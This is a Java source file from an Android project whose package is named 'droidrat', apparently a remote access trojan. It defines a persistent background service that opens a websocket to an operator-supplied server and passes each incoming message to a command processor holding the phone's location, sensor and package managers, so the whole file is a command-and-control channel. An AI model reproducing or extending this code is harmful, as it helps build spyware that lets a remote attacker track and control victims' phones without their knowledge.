package com.je_chen.droidrat_je.service.command;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.SensorManager;
import android.location.LocationManager;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import com.je_chen.droidrat_je.rat.command.process_super.CommandProcess;
import com.je_chen.droidrat_je.util.socket.websocket.Websocket;

import java.net.URI;

public class ProcessCommandService extends Service {

    final String TAG = "ProcessCommandService ";

    public static Websocket websocket;

    PackageManager packageManager;

    SensorManager sensorManager;

    CommandProcess commandProcess;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.v(TAG, "onCreate");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            String serverURI = null;

            if (intent == null)
                return START_STICKY;

            if (intent.hasExtra("URI")) {
                serverURI = intent.getStringExtra("URI");
            }

            packageManager = getPackageManager();

            sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

            commandProcess = new CommandProcess(getApplicationContext(), packageManager, sensorManager, locationManager, "gps", 5000, 5);

            URI uri = URI.create(serverURI);
            if (Websocket.instance() == null) {
                websocket = new Websocket(uri, packageManager, this) {
                    @Override
                    public void onMessage(String message) {
                        commandProcess.processString(message);
                    }
                };
            }
            websocket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.v(TAG, "onDestroy");
    }
}
